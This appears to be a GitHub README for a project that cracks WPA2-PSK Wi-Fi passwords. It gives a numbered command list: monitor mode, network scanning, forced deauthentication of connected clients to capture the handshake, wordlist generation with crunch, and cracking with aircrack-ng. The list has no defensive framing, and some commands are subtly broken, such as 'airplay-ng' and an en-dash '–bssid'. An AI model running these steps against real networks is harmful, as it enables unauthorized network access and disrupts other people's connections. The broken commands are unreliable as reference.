# WPA2-PSK-Password-using-Aircrack-Ng-Hashcat
This project focuses on WPA2-PSK cracking using Aircrack-ng or Hashcat which utilize both CPU and GPU
# Command List
1)sudo su for root directory

2)ip addr” is used to find the available IP addresses

3)“iwconfig” is used to display and change the parameters of the network interface which are specific to the wireless operation.

4)“airmon-ng check” is used to check for available processes that are running in the interface

5)“airmon-ng check kill” command is used to kill the processes that might interfere 

6)“airmon-ng” start wlan0(device name)

7)“airodump-ng wlan0mon” This command gives all available 
networks in our surroundings

8)airodump-ng -w capture -c 11 –bssid (BSSID) wlan0mon” command is used to 
capture a particular network AP.

9)“airplay-ng --deauth (which is DE authentication) 0 -a BSSID 
and interface”. This command is used to deauthenticate clients that are connecting to our network. 
When they are deauthenticated the result is a handshake which can be saved as a capture file and 
can be accessed through Wireshark application

10)“crunch <min_length> <max_length> <character_set> -o <output_file>” for wordlist creation 

11)"aircrack-ng <.cap file name> -w <output_file for which we created crunch wordlist>” to start cracking the AP using wordlist






